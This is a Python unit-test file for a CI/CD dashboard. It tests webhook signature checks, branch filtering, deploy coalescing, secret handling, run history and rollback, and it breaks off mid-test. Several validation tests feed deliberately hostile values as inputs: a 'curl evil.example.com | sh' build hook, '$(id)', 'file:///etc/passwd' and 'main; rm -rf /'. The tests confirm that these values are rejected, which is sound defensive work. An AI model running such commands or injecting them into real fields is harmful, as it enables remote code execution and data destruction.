"""Tests for dashboard/cicd.py — webhook signature verification, payload filtering,
branch filtering, concurrency/coalescing, the pipeline store, and run history.

Signature tests use a real ``hmac`` computation, never a mock: the point is to prove that a
correctly signed body is accepted and that a tampered body, a wrong secret and a missing
signature are all rejected.

Run with the repo root or dashboard/ on the path::

    python3 -m unittest discover -s dashboard/tests -p 'test_cicd*.py' -t dashboard
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import sys
import tempfile
import types
from unittest import mock
import threading
import time
import unittest
from pathlib import Path

_DASH = Path(__file__).resolve().parents[1]
if str(_DASH) not in sys.path:
    sys.path.insert(0, str(_DASH))

import cicd  # noqa: E402


class Headers(dict):
    """Case-insensitive header mapping, like Werkzeug's."""

    def get(self, key, default=None):  # type: ignore[override]
        target = str(key).lower()
        for k, v in self.items():
            if str(k).lower() == target:
                return v
        return default


def github_headers(secret: str, body: bytes, *, event: str = "push", delivery: str = "") -> Headers:
    digest = hmac.new(secret.encode("utf-8"), body, hashlib.sha256).hexdigest()
    h = Headers({"X-GitHub-Event": event, "X-Hub-Signature-256": "sha256=" + digest})
    if delivery:
        h["X-GitHub-Delivery"] = delivery
    return h


def github_push_body(*, ref: str = "refs/heads/main", sha: str = "a" * 40, message: str = "add feature", commits: int = 1) -> bytes:
    payload = {
        "ref": ref,
        "before": "b" * 40,
        "after": sha,
        "deleted": False,
        "commits": [{"id": sha, "message": message} for _ in range(commits)],
        "head_commit": {"id": sha, "message": message} if commits else None,
        "pusher": {"name": "octocat"},
        "repository": {"full_name": "octocat/hello-world"},
    }
    return json.dumps(payload).encode("utf-8")


def gitlab_push_body(*, ref: str = "refs/heads/main", sha: str = "c" * 40) -> bytes:
    payload = {
        "object_kind": "push",
        "ref": ref,
        "before": "d" * 40,
        "after": sha,
        "checkout_sha": sha,
        "total_commits_count": 1,
        "commits": [{"id": sha, "message": "gitlab commit"}],
        "user_username": "gitlab-user",
    }
    return json.dumps(payload).encode("utf-8")


class TempStoreCase(unittest.TestCase):
    """Point the pipeline store and run history at a scratch directory."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        root = Path(self._tmp.name)
        self._env = {
            "LECO_CICD_PIPELINES_FILE": str(root / "config" / "cicd-pipelines.yaml"),
            "LECO_CICD_RUNS_FILE": str(root / "generated" / "cicd-runs.jsonl"),
        }
        self._saved = {k: os.environ.get(k) for k in self._env}
        os.environ.update(self._env)
        (root / "config").mkdir(parents=True, exist_ok=True)
        (root / "generated").mkdir(parents=True, exist_ok=True)
        # Scheduler state is module-level; keep tests independent of each other.
        with cicd._RUN_LOCK:
            cicd._RUNNING.clear()
            cicd._PENDING.clear()
            cicd._ACTIVE_RUNS.clear()
            cicd._SEEN_DELIVERIES.clear()

    def tearDown(self) -> None:
        for k, v in self._saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
        self._tmp.cleanup()

    def make_pipeline(self, **overrides):
        data = {
            "app_slug": "demo-app",
            "repo_url": "https://github.com/octocat/hello-world.git",
            "branch": "main",
            "provider": "auto",
            "auto_deploy": True,
        }
        data.update(overrides)
        return cicd.create_pipeline(data)


# ---------------------------------------------------------------------------
# 1. Signature verification — proven both ways, with real HMAC
# ---------------------------------------------------------------------------


class TestGithubSignature(TempStoreCase):
    def test_correctly_signed_payload_is_accepted(self):
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        ok, scheme = cicd.verify_signature(pipeline, github_headers(secret, body), body)
        self.assertTrue(ok)
        self.assertEqual(scheme, "github")

    def test_tampered_body_is_rejected(self):
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        headers = github_headers(secret, body)  # signature computed over the ORIGINAL body
        tampered = body.replace(b"add feature", b"add backdoor")
        self.assertNotEqual(body, tampered)
        ok, _ = cicd.verify_signature(pipeline, headers, tampered)
        self.assertFalse(ok)

    def test_wrong_secret_is_rejected(self):
        pipeline, _secret = self.make_pipeline()
        body = github_push_body()
        headers = github_headers("not-the-real-secret", body)
        ok, _ = cicd.verify_signature(pipeline, headers, body)
        self.assertFalse(ok)

    def test_missing_signature_is_rejected(self):
        pipeline, _secret = self.make_pipeline()
        body = github_push_body()
        ok, _ = cicd.verify_signature(pipeline, Headers({"X-GitHub-Event": "push"}), body)
        self.assertFalse(ok)

    def test_signature_without_sha256_prefix_is_rejected(self):
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        raw = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
        ok, _ = cicd.verify_signature(pipeline, Headers({"X-Hub-Signature-256": raw}), body)
        self.assertFalse(ok)

    def test_sha1_signature_is_not_accepted(self):
        """The deprecated X-Hub-Signature (SHA-1) header must not authenticate anything."""
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        sha1 = "sha1=" + hmac.new(secret.encode(), body, hashlib.sha1).hexdigest()
        ok, _ = cicd.verify_signature(pipeline, Headers({"X-Hub-Signature": sha1}), body)
        self.assertFalse(ok)

    def test_empty_secret_never_authenticates(self):
        body = b"{}"
        headers = Headers({"X-Hub-Signature-256": "sha256=" + hmac.new(b"", body, hashlib.sha256).hexdigest()})
        ok, _ = cicd.verify_signature({"secret": "", "provider": "github"}, headers, body)
        self.assertFalse(ok)


class TestGitlabSignature(TempStoreCase):
    def test_correct_token_accepted(self):
        pipeline, secret = self.make_pipeline(provider="gitlab")
        body = gitlab_push_body()
        headers = Headers({"X-Gitlab-Event": "Push Hook", "X-Gitlab-Token": secret})
        ok, scheme = cicd.verify_signature(pipeline, headers, body)
        self.assertTrue(ok)
        self.assertEqual(scheme, "gitlab")

    def test_wrong_token_rejected(self):
        pipeline, _secret = self.make_pipeline(provider="gitlab")
        headers = Headers({"X-Gitlab-Event": "Push Hook", "X-Gitlab-Token": "nope"})
        ok, _ = cicd.verify_signature(pipeline, headers, gitlab_push_body())
        self.assertFalse(ok)

    def test_missing_token_rejected(self):
        pipeline, _secret = self.make_pipeline(provider="gitlab")
        ok, _ = cicd.verify_signature(pipeline, Headers({"X-Gitlab-Event": "Push Hook"}), gitlab_push_body())
        self.assertFalse(ok)

    def test_github_pipeline_does_not_accept_a_gitlab_token(self):
        pipeline, secret = self.make_pipeline(provider="github")
        headers = Headers({"X-Gitlab-Token": secret})
        ok, _ = cicd.verify_signature(pipeline, headers, gitlab_push_body())
        self.assertFalse(ok)


class TestGenericSignature(TempStoreCase):
    def test_generic_hmac_roundtrip(self):
        pipeline, secret = self.make_pipeline(provider="generic")
        body = github_push_body()
        digest = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
        ok, scheme = cicd.verify_signature(pipeline, Headers({"X-LEco-Signature": "sha256=" + digest}), body)
        self.assertTrue(ok)
        self.assertEqual(scheme, "generic")

    def test_generic_rejects_tampered_body(self):
        pipeline, secret = self.make_pipeline(provider="generic")
        body = github_push_body()
        digest = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
        ok, _ = cicd.verify_signature(pipeline, Headers({"X-LEco-Signature": digest}), body + b" ")
        self.assertFalse(ok)


# ---------------------------------------------------------------------------
# 2. handle_webhook — rejection has no side effect and leaks nothing
# ---------------------------------------------------------------------------


class TestWebhookGate(TempStoreCase):
    def test_unsigned_request_is_rejected_with_no_side_effect(self):
        pipeline, _secret = self.make_pipeline()
        body = github_push_body()
        before = cicd.list_runs()["total"]
        payload, status = cicd.handle_webhook(pipeline["id"], Headers({"X-GitHub-Event": "push"}), body)
        self.assertEqual(status, 403)
        self.assertEqual(payload, {"ok": False, "error": "forbidden"})
        self.assertEqual(cicd.list_runs()["total"], before)
        self.assertFalse(cicd.is_busy(pipeline["id"]))

    def test_unknown_pipeline_looks_identical_to_a_bad_signature(self):
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        good = cicd.handle_webhook("does-not-exist", github_headers(secret, body), body)
        bad = cicd.handle_webhook(pipeline["id"], github_headers("wrong", body), body)
        self.assertEqual(good, bad)
        self.assertEqual(good[1], 403)

    def test_oversize_body_rejected_before_hmac(self):
        pipeline, secret = self.make_pipeline()
        body = b"x" * (cicd.MAX_WEBHOOK_BODY_BYTES + 1)
        _payload, status = cicd.handle_webhook(pipeline["id"], github_headers(secret, body), body)
        self.assertEqual(status, 403)


# ---------------------------------------------------------------------------
# 3. Event filtering — branch, non-push, empty pushes
# ---------------------------------------------------------------------------


class TestEventParsing(TempStoreCase):
    def test_github_push_is_actionable(self):
        body = github_push_body(sha="f" * 40, message="ship it")
        event = cicd.parse_event(github_headers("s", body), body, "github")
        self.assertEqual(event["action"], "run")
        self.assertEqual(event["branch"], "main")
        self.assertEqual(event["sha"], "f" * 40)
        self.assertEqual(event["subject"], "ship it")

    def test_non_push_event_ignored(self):
        body = json.dumps({"action": "opened", "pull_request": {}}).encode()
        event = cicd.parse_event(Headers({"X-GitHub-Event": "pull_request"}), body, "github")
        self.assertEqual(event["action"], "ignore")
        self.assertIn("not a push", event["reason"])

    def test_ping_event_ignored(self):
        event = cicd.parse_event(Headers({"X-GitHub-Event": "ping"}), b"{}", "github")
        self.assertEqual(event["action"], "ignore")
        self.assertEqual(event["reason"], "ping")

    def test_branch_delete_ignored(self):
        payload = {"ref": "refs/heads/main", "after": "0" * 40, "deleted": True, "commits": []}
        body = json.dumps(payload).encode()
        event = cicd.parse_event(Headers({"X-GitHub-Event": "push"}), body, "github")
        self.assertEqual(event["action"], "ignore")
        self.assertIn("deleted", event["reason"])

    def test_push_with_no_commits_ignored(self):
        body = github_push_body(commits=0)
        event = cicd.parse_event(Headers({"X-GitHub-Event": "push"}), body, "github")
        self.assertEqual(event["action"], "ignore")

    def test_tag_push_ignored(self):
        body = github_push_body(ref="refs/tags/v1.2.3")
        event = cicd.parse_event(Headers({"X-GitHub-Event": "push"}), body, "github")
        self.assertEqual(event["action"], "ignore")
        self.assertIn("not a branch", event["reason"])

    def test_gitlab_push_parsed(self):
        body = gitlab_push_body()
        event = cicd.parse_event(Headers({"X-Gitlab-Event": "Push Hook"}), body, "gitlab")
        self.assertEqual(event["action"], "run")
        self.assertEqual(event["branch"], "main")


class TestBranchFiltering(TempStoreCase):
    def test_push_to_develop_does_not_deploy_a_main_pipeline(self):
        pipeline, secret = self.make_pipeline(branch="main")
        body = github_push_body(ref="refs/heads/develop", sha="1" * 40)
        payload, status = cicd.handle_webhook(pipeline["id"], github_headers(secret, body), body)
        self.assertEqual(status, 202)
        self.assertFalse(payload["accepted"])
        self.assertIn("develop", payload["reason"])
        self.assertIn("main", payload["reason"])
        self.assertEqual(cicd.list_runs()["total"], 0)

    def test_push_to_main_is_accepted_by_a_main_pipeline(self):
        pipeline, secret = self.make_pipeline(branch="main")
        started = threading.Event()

        def fake_runner(_pipeline, run):
            started.set()
            cicd._finish_run(run, "success", "stub")

        body = github_push_body(ref="refs/heads/main", sha="2" * 40)
        event = cicd.parse_event(github_headers(secret, body), body, "github")
        self.assertEqual(event["action"], "run")
        result = cicd.enqueue(pipeline, trigger="webhook", event=event, runner=fake_runner)
        self.assertTrue(started.wait(5))
        self.assertTrue(result["run_id"])

    def test_auto_deploy_off_acknowledges_without_running(self):
        pipeline, secret = self.make_pipeline(auto_deploy=False)
        body = github_push_body()
        payload, status = cicd.handle_webhook(pipeline["id"], github_headers(secret, body), body)
        self.assertEqual(status, 202)
        self.assertFalse(payload["accepted"])
        self.assertIn("auto-deploy", payload["reason"])
        self.assertEqual(cicd.list_runs()["total"], 0)

    def test_duplicate_delivery_is_not_re_run(self):
        pipeline, secret = self.make_pipeline()
        body = github_push_body()
        headers = github_headers(secret, body, delivery="delivery-1")
        cicd._SEEN_DELIVERIES.clear()
        first = cicd._remember_delivery(f"{pipeline['id']}:delivery-1")
        second = cicd._remember_delivery(f"{pipeline['id']}:delivery-1")
        self.assertTrue(first)
        self.assertFalse(second)
        payload, status = cicd.handle_webhook(pipeline["id"], headers, body)
        self.assertEqual(status, 202)
        self.assertFalse(payload["accepted"])
        self.assertIn("duplicate", payload["reason"])


# ---------------------------------------------------------------------------
# 4. Concurrency — a burst of pushes is one run, not one run per push
# ---------------------------------------------------------------------------


class TestConcurrency(TempStoreCase):
    def test_two_rapid_webhooks_for_the_same_commit_produce_one_run(self):
        pipeline, secret = self.make_pipeline()
        release = threading.Event()
        entered = threading.Event()
        calls = []

        def slow_runner(_pipeline, run):
            calls.append(run["run_id"])
            entered.set()
            release.wait(10)
            cicd._finish_run(run, "success", "stub")

        body = github_push_body(sha="3" * 40)
        headers = github_headers(secret, body, delivery="d-1")
        event = cicd.parse_event(headers, body, "github")

        first = cicd.enqueue(pipeline, trigger="webhook", event=event, runner=slow_runner)
        self.assertTrue(entered.wait(5))
        second = cicd.enqueue(pipeline, trigger="webhook", event=event, runner=slow_runner)

        self.assertTrue(first["run_id"])
        self.assertTrue(second["coalesced"])
        self.assertEqual(second["run_id"], first["run_id"])

        release.set()
        for _ in range(100):
            if not cicd.is_busy(pipeline["id"]):
                break
            time.sleep(0.05)

        self.assertEqual(len(calls), 1, "the same commit must not deploy twice")
        runs = cicd.list_runs(pipeline_id=pipeline["id"])
        self.assertEqual(runs["total"], 1)
        self.assertEqual(runs["runs"][0]["coalesced"], 1)

    def test_ten_pushes_of_the_same_commit_start_one_deploy(self):
        pipeline, secret = self.make_pipeline()
        release = threading.Event()
        entered = threading.Event()
        calls = []

        def slow_runner(_pipeline, run):
            calls.append(run["run_id"])
            entered.set()
            release.wait(10)
            cicd._finish_run(run, "success", "stub")

        body = github_push_body(sha="4" * 40)
        event = cicd.parse_event(github_headers(secret, body), body, "github")
        cicd.enqueue(pipeline, trigger="webhook", event=event, runner=slow_runner)
        self.assertTrue(entered.wait(5))
        for _ in range(9):
            cicd.enqueue(pipeline, trigger="webhook", event=event, runner=slow_runner)
        release.set()
        for _ in range(200):
            if not cicd.is_busy(pipeline["id"]):
                break
            time.sleep(0.05)
        self.assertEqual(len(calls), 1)
        self.assertEqual(cicd.list_runs(pipeline_id=pipeline["id"])["total"], 1)

    def test_a_newer_commit_queues_exactly_one_follow_up_run(self):
        pipeline, secret = self.make_pipeline()
        release = threading.Event()
        entered = threading.Event()
        seen_shas = []

        def slow_runner(_pipeline, run):
            seen_shas.append(run["commit_sha"])
            entered.set()
            release.wait(10)
            cicd._finish_run(run, "success", "stub")

        body_a = github_push_body(sha="a" * 40)
        cicd.enqueue(
            pipeline,
            trigger="webhook",
            event=cicd.parse_event(github_headers(secret, body_a), body_a, "github"),
            runner=slow_runner,
        )
        self.assertTrue(entered.wait(5))

        # Three newer commits land while the first deploy is in flight. Only the newest survives.
        for sha in ("b" * 40, "c" * 40, "d" * 40):
            body = github_push_body(sha=sha)
            cicd.enqueue(
                pipeline,
                trigger="webhook",
                event=cicd.parse_event(github_headers(secret, body), body, "github"),
                runner=slow_runner,
            )

        release.set()
        for _ in range(200):
            if not cicd.is_busy(pipeline["id"]):
                break
            time.sleep(0.05)

        self.assertEqual(seen_shas, ["a" * 40, "d" * 40], "only the newest queued commit is deployed")
        self.assertEqual(cicd.list_runs(pipeline_id=pipeline["id"])["total"], 2)

    def test_crashing_pipeline_still_records_a_failed_run_and_frees_the_slot(self):
        pipeline, _secret = self.make_pipeline()

        def boom(_pipeline, _run):
            raise RuntimeError("compose exploded")

        cicd.enqueue(pipeline, trigger="manual", event={"sha": "e" * 40}, runner=boom)
        for _ in range(100):
            if not cicd.is_busy(pipeline["id"]):
                break
            time.sleep(0.05)
        self.assertFalse(cicd.is_busy(pipeline["id"]))
        runs = cicd.list_runs(pipeline_id=pipeline["id"])["runs"]
        self.assertEqual(len(runs), 1)
        self.assertEqual(runs[0]["status"], "failed")
        self.assertIn("compose exploded", runs[0]["outcome"])


# ---------------------------------------------------------------------------
# 5. Pipeline store — secrets in, never out
# ---------------------------------------------------------------------------


class TestPipelineStore(TempStoreCase):
    def test_secret_is_returned_once_and_never_again(self):
        pipeline, secret = self.make_pipeline()
        self.assertTrue(secret)
        public = cicd.public_pipeline(pipeline)
        self.assertNotIn("secret", public)
        self.assertTrue(public["secret_set"])
        self.assertNotIn(secret, json.dumps(public))

    def test_overview_never_leaks_a_secret(self):
        _pipeline, secret = self.make_pipeline()
        blob = json.dumps(cicd.build_overview(webhook_base="https://leco.example.com"))
        self.assertNotIn(secret, blob)

    def test_pipelines_file_is_owner_only(self):
        self.make_pipeline()
        mode = Path(os.environ["LECO_CICD_PIPELINES_FILE"]).stat().st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_rotate_secret_invalidates_the_old_one(self):
        pipeline, old = self.make_pipeline()
        body = github_push_body()
        self.assertTrue(cicd.verify_signature(cicd.get_pipeline(pipeline["id"]), github_headers(old, body), body)[0])
        new = cicd.rotate_secret(pipeline["id"])
        self.assertNotEqual(new, old)
        refreshed = cicd.get_pipeline(pipeline["id"])
        self.assertFalse(cicd.verify_signature(refreshed, github_headers(old, body), body)[0])
        self.assertTrue(cicd.verify_signature(refreshed, github_headers(new, body), body)[0])

    def test_arbitrary_shell_command_is_not_accepted_as_a_build_hook(self):
        with self.assertRaises(cicd.PipelineError):
            self.make_pipeline(build_hook_service="npm test && curl evil.example.com | sh")
        with self.assertRaises(cicd.PipelineError):
            self.make_pipeline(build_hook_service="$(id)")

    def test_compose_service_name_is_accepted_as_a_build_hook(self):
        pipeline, _secret = self.make_pipeline(build_hook_service="leco-ci")
        self.assertEqual(cicd.public_pipeline(pipeline)["build_hook_service"], "leco-ci")

    def test_bad_repo_url_and_branch_rejected(self):
        with self.assertRaises(cicd.PipelineError):
            self.make_pipeline(repo_url="file:///etc/passwd")
        with self.assertRaises(cicd.PipelineError):
            self.make_pipeline(branch="main; rm -rf /")

    def test_update_and_delete(self):
        pipeline, _secret = self.make_pipeline()
        updated = cicd.update_pipeline(pipeline["id"], {"branch": "release"})
        self.assertEqual(updated["branch"], "release")
        self.assertEqual(updated["secret"], pipeline["secret"], "update must not disturb the secret")
        self.assertTrue(cicd.delete_pipeline(pipeline["id"]))
        self.assertFalse(cicd.delete_pipeline(pipeline["id"]))

    def test_rollback_pointer_tracks_the_previous_sha(self):
        pipeline, _secret = self.make_pipeline()
        pid = pipeline["id"]
        cicd._record_deploy_sha(pid, "1" * 40)
        cicd._record_deploy_sha(pid, "2" * 40)
        refreshed = cicd.get_pipeline(pid)
        self.assertEqual(refreshed["last_deployed_sha"], "2" * 40)
        self.assertEqual(refreshed["previous_deployed_sha"], "1" * 40)

    def test_rollback_without_history_is_refused(self):
        pipeline, _secret = self.make_pipeline()
        body, status = cicd.trigger_rollback(pipeline["id"])
        self.assertEqual(status, 400)
        self.assertIn("nothing to roll back", body["error"])

    def test_rollback_to_the_currently_deployed_commit_is_refused(self):
        pipeline, _secret = self.make_pipeline()
        cicd._record_deploy_sha(pipeline["id"], "1" * 40)
        body, status = cicd.trigger_rollback(pipeline["id"], "1" * 40)
        self.assertEqual(status, 400)
        self.assertIn("already the deployed one", body["error"])

    def test_rollback_leaves_a_roll_forward_target(self):
        """After rolling back, the SHA we rolled back FROM becomes the next rollback target."""
        pipeline, _secret = self.make_pipeline()
        pid = pipeline["id"]
        cicd._record_deploy_sha(pid, "a" * 40)  # good release
        cicd._record_deploy_sha(pid, "b" * 40)  # bad release
        run = cicd._new_run(cicd.get_pipeline(pid), trigger="rollback", event={}, target_sha="a" * 40, rollback_of="b" * 40)
        for name in ("step_pull", "step_build", "step_deploy", "step_verify"):
            setattr(cicd, "_saved_" + name, getattr(cicd, name))
        cicd.step_pull = lambda r, p, ref: r.update({"commit_sha": "a" * 40}) or {}
        cicd.step_build = lambda r, p: None
        cicd.step_deploy = lambda r, p: {}
        cicd.step_verify = lambda r, p: r.update({"verify": {"checked": True, "ok": True, "status_code": 200}}) or {}
        try:
            cicd.execute_run(cicd.get_pipeline(pid), run)
        finally:
            for name in ("step_pull", "step_build", "step_deploy", "step_verify"):
                setattr(cicd, name, getattr(cicd, "_saved_" + name))
        refreshed = cicd.get_pipeline(pid)
        self.assertEqual(refreshed["last_deployed_sha"], "a" * 40)
        self.assertEqual(refreshed["previous_deployed_sha"], "b" * 40)
        self.assertEqual(run["status"], "success")


# ---------------------------------------------------------------------------
# 6. Run history — newest first, bounded, filterable, paginated
# ---------------------------------------------------------------------------


class TestRunHistory(TempStoreCase):
    def _record(self, pipeline_id: str, run_id: str, *, status: str, started: str, trigger: str = "webhook"):
        cicd._append_run_snapshot(
            {
                "run_id": run_id,
                "pipeline_id": pipeline_id,
                "status": status,
                "trigger": trigger,
                "started_at": started,
                "log": "x" * 100,
            }
        )

    def test_newest_first_with_filters_and_pagination(self):
        self._record("p1", "r1", status="success", started="2026-08-01T00:00:00+00:00")
        self._record("p1", "r2", status="failed", started="2026-08-02T00:00:00+00:00")
        self._record("p2", "r3", status="success", started="2026-08-03T00:00:00+00:00", trigger="manual")

        allruns = cicd.list_runs()
        self.assertEqual([r["run_id"] for r in allruns["runs"]], ["r3", "r2", "r1"])
        self.assertEqual(allruns["total"], 3)

        self.assertEqual([r["run_id"] for r in cicd.list_runs(pipeline_id="p1")["runs"]], ["r2", "r1"])
        self.assertEqual([r["run_id"] for r in cicd.list_runs(status="failed")["runs"]], ["r2"])
        self.assertEqual([r["run_id"] for r in cicd.list_runs(trigger="manual")["runs"]], ["r3"])

        page = cicd.list_runs(limit=1, offset=1)
        self.assertEqual([r["run_id"] for r in page["runs"]], ["r2"])
        self.assertEqual(page["total"], 3)

    def test_later_snapshot_replaces_the_earlier_one_for_a_run(self):
        self._record("p1", "r1", status="running", started="2026-08-01T00:00:00+00:00")
        self._record("p1", "r1", status="success", started="2026-08-01T00:00:00+00:00")
        runs = cicd.list_runs()["runs"]
        self.assertEqual(len(runs), 1)
        self.assertEqual(runs[0]["status"], "success")

    def test_list_view_omits_the_log_but_reports_its_size(self):
        self._record("p1", "r1", status="success", started="2026-08-01T00:00:00+00:00")
        row = cicd.list_runs()["runs"][0]
        self.assertNotIn("log", row)
        self.assertEqual(row["log_chars"], 100)
        detail = cicd.get_run("r1")
        self.assertEqual(len(detail["log"]), 100)

    def test_corrupt_line_is_skipped_not_fatal(self):
        path = Path(os.environ["LECO_CICD_RUNS_FILE"])
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text('{"run_id": "ok", "started_at": "2026-01-01T00:00:00+00:00"}\n{"run_id": "trunc"', encoding="utf-8")
        runs = cicd.list_runs()["runs"]
        self.assertEqual([r["run_id"] for r in runs], ["ok"])

    def test_rotation_caps_the_history(self):
        for i in range(cicd.MAX_RUNS + 25):
            self._record("p1", f"r{i:04d}", status="success", started=f"2026-08-01T00:00:{i % 60:02d}+00:00")
        cicd._rotate_runs_locked()
        lines = Path(os.environ["LECO_CICD_RUNS_FILE"]).read_text(encoding="utf-8").strip().splitlines()
        self.assertEqual(len(lines), cicd.MAX_RUNS)

    def test_run_left_running_by_a_restart_is_reported_interrupted(self):
        """The dashboard restarts. A persisted 'running' run this process does not own is over."""
        self._record("p1", "r1", status="running", started="2026-08-01T00:00:00+00:00")
        row = cicd.list_runs()["runs"][0]
        self.assertEqual(row["status"], "interrupted")
        self.assertIn("restarted", row["outcome"])

    def test_a_genuinely_live_run_is_not_marked_interrupted(self):
        self._record("p1", "r1", status="running", started="2026-08-01T00:00:00+00:00")
        with cicd._RUN_LOCK:
            cicd._ACTIVE_RUNS["r1"] = {
                "run_id": "r1",
                "pipeline_id": "p1",
                "status": "running",
                "started_at": "2026-08-01T00:00:00+00:00",
            }
        try:
            self.assertEqual(cicd.list_runs()["runs"][0]["status"], "running")
        finally:
            with cicd._RUN_LOCK:
                cicd._ACTIVE_RUNS.pop("r1", None)

    def test_log_capture_is_bounded(self):
        run = {"log": ""}
        cicd._log_line(run, "y" * (cicd.MAX_LOG_CHARS * 2))
        self.assertLessEqual(len(run["log"]), cicd.MAX_LOG_CHARS + 80)
        self.assertIn("truncated", run["log"])


# ---------------------------------------------------------------------------
# 7. git_source dependency — absent module degrades, never fakes success
# ---------------------------------------------------------------------------


class TestGitSourceDependency(TempStoreCase):
    def test_missing_module_reports_a_clear_message(self):
        saved = sys.modules.pop("git_source", None)
        sys.modules["git_source"] = None  # type: ignore[assignment]
        try:
            with self.assertRaises(cicd.GitSourceUnavailable) as ctx:
                cicd.git_clone_or_update("https://example.com/r.git", "main")
            self.assertIn("Git source module unavailable", str(ctx.exception))
        finally:
            sys.modules.pop("git_source", None)
            if saved is not None:
                sys.modules["git_source"] = saved

    def test_pull_step_fails_the_run_when_git_source_is_missing(self):
        pipeline, _secret = self.make_pipeline()
        saved = sys.modules.pop("git_source", None)
        sys.modules["git_source"] = None  # type: ignore[assignment]
        try:
            run = cicd._new_run(pipeline, trigger="manual", event={})
            cicd.execute_run(pipeline, run)
        finally:
            sys.modules.pop("git_source", None)
            if saved is not None:
                sys.modules["git_source"] = saved
        self.assertEqual(run["status"], "failed")
        self.assertIn("Git source module unavailable", run["outcome"])
        self.assertEqual(run["steps"][0]["name"], "pull")
        self.assertEqual(run["steps"][0]["status"], "failed")

    def test_clone_contract_is_normalized(self):
        class Stub:
            @staticmethod
            def clone_or_update(repo_url, ref):
                return {
                    "path": "wsp:demo-repo",
                    "ref": ref,
                    "sha": "9" * 40,
                    "subject": "stubbed commit",
                    "fresh_clone": True,
                }

        saved = sys.modules.get("git_source")
        sys.modules["git_source"] = Stub  # type: ignore[assignment]
        try:
            result = cicd.git_clone_or_update("https://example.com/r.git", "main")
        finally:
            if saved is None:
                sys.modules.pop("git_source", None)
            else:
                sys.modules["git_source"] = saved
        self.assertEqual(result["path"], "wsp:demo-repo")
        self.assertEqual(result["sha"], "9" * 40)
        self.assertTrue(result["fresh_clone"])

    def test_real_git_source_signature_is_used_with_reset(self):
        """dashboard/git_source.py takes keyword-only url=/ref= and returns commit/commit_subject.

        The CI clone is machine-owned, so reset=True must be passed: a tree left detached by a
        rollback must not wedge the next deploy.
        """
        seen = {}

        class Stub:
            @staticmethod
            def clone_or_update(**kwargs):
                seen.update(kwargs)
                return {
                    "ok": True,
                    "action": "updated",
                    "path": "/clones/demo",
                    "path_field": "wsp:clones/demo",
                    "commit": "7" * 40,
                    "commit_subject": "real-shape commit",
                    "ref": kwargs.get("ref", ""),
                    "notes": ["discarded local changes"],
                }

        saved = sys.modules.get("git_source")
        sys.modules["git_source"] = Stub  # type: ignore[assignment]
        try:
            result = cicd.git_clone_or_update("https://example.com/r.git", "main", dir_name="cicd-demo", app_id="demo")
        finally:
            if saved is None:
                sys.modules.pop("git_source", None)
            else:
                sys.modules["git_source"] = saved
        self.assertEqual(seen["url"], "https://example.com/r.git")
        self.assertEqual(seen["ref"], "main")
        self.assertTrue(seen["reset"])
        self.assertEqual(seen["dir_name"], "cicd-demo")
        self.assertEqual(result["path"], "wsp:clones/demo")
        self.assertEqual(result["sha"], "7" * 40)
        self.assertEqual(result["subject"], "real-shape commit")
        self.assertFalse(result["fresh_clone"])

    def test_clone_failure_is_surfaced_not_swallowed(self):
        class Stub:
            @staticmethod
            def clone_or_update(**_kwargs):
                return {"ok": False, "error": "Repository not found or access denied"}

        saved = sys.modules.get("git_source")
        sys.modules["git_source"] = Stub  # type: ignore[assignment]
        try:
            with self.assertRaises(RuntimeError) as ctx:
                cicd.git_clone_or_update("https://example.com/missing.git", "main")
        finally:
            if saved is None:
                sys.modules.pop("git_source", None)
            else:
                sys.modules["git_source"] = saved
        self.assertIn("Repository not found", str(ctx.exception))


# ---------------------------------------------------------------------------
# 8. Verify — a deploy that leaves the app 502-ing is a failed run
# ---------------------------------------------------------------------------


class TestVerifyStep(TempStoreCase):
    def test_bad_gateway_fails_the_step(self):
        pipeline, _secret = self.make_pipeline(verify_url="https://demo-app.lh/")
        run = cicd._new_run(pipeline, trigger="manual", event={})
        saved_probe = cicd._probe
        saved_interval = cicd.VERIFY_INTERVAL_SEC
        cicd._probe = lambda url: {"checked": True, "url": url, "ok": False, "status_code": 502, "ms": 3}
        cicd.VERIFY_INTERVAL_SEC = 0.0
        try:
            with self.assertRaises(RuntimeError):
                cicd.step_verify(run, pipeline)
        finally:
            cicd._probe = saved_probe
            cicd.VERIFY_INTERVAL_SEC = saved_interval
        self.assertEqual(run["steps"][-1]["status"], "failed")
        self.assertEqual(run["verify"]["status_code"], 502)
        self.assertEqual(len(run["verify"]["attempts"]), cicd.VERIFY_ATTEMPTS)

    def test_healthy_app_passes(self):
        pipeline, _secret = self.make_pipeline(verify_url="https://demo-app.lh/")
        run = cicd._new_run(pipeline, trigger="manual", event={})
        saved_probe = cicd._probe
        cicd._probe = lambda url: {"checked": True, "url": url, "ok": True, "status_code": 200, "ms": 12}
        try:
            cicd.step_verify(run, pipeline)
        finally:
            cicd._probe = saved_probe
        self.assertEqual(run["steps"][-1]["status"], "ok")
        self.assertTrue(run["verify"]["ok"])

    def test_no_verify_url_is_skipped_not_silently_passed(self):
        pipeline, _secret = self.make_pipeline()
        run = cicd._new_run(pipeline, trigger="manual", event={})
        saved = cicd._derive_verify_url
        cicd._derive_verify_url = lambda _p: ""
        try:
            cicd.step_verify(run, pipeline)
        finally:
            cicd._derive_verify_url = saved
        self.assertEqual(run["steps"][-1]["status"], "skipped")
        self.assertFalse(run["verify"]["checked"])



class TestPrivateRepoCredential(unittest.TestCase):
    """A pipeline against a private repo has no operator to answer a prompt.

    ``git_source.clone_or_update`` accepts a saved credential id; CI/CD originally never
    passed one, so a private-repo pipeline could only ever fail at pull.
    """

    def _fake_module(self, seen):
        def fake_clone(**kwargs):
            seen.update(kwargs)
            return {"path_field": "wsp:x", "ref": "main", "commit": "abc123",
                    "commit_subject": "s", "action": "cloned"}
        return types.SimpleNamespace(clone_or_update=fake_clone)

    def test_credential_id_is_a_pipeline_field(self):
        out = cicd._validate_fields({"app_slug": "demo", "repo_url": "https://example.com/a.git",
